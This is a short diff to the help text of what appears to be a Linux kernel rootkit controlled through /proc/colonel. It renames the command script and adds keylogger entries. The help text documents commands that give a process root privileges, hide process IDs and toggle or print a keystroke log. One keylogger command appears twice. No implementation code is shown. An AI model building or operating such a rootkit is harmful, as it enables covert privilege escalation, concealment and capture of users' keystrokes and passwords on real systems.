@@ -145,11 +145,13 @@ USAGE:\n\
   From command line --\n\
   $ echo -n <command> >> /proc/colonel\n\n\
   From colcmd --\n\
-  $ ./colcmd.py hp1337\n\n\
+  $ ./rtcmd.py hp1337\n\n\
   To get root access --\n\
-  $ ./colcmd.py hackbright /bin/bash\n\n\
+  $ ./rtcmd.py hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright - uid and gid 0 for writing process\n\
+  tls - toggles keylogger on/off\n\
+  keylog -- print keyboard input log keylogger is set to 0\n\
   hpXXXX - hides process id XXXX\n\
   sp - shows last hidden process\n\
   tls - toggles keylogger on/off\n\
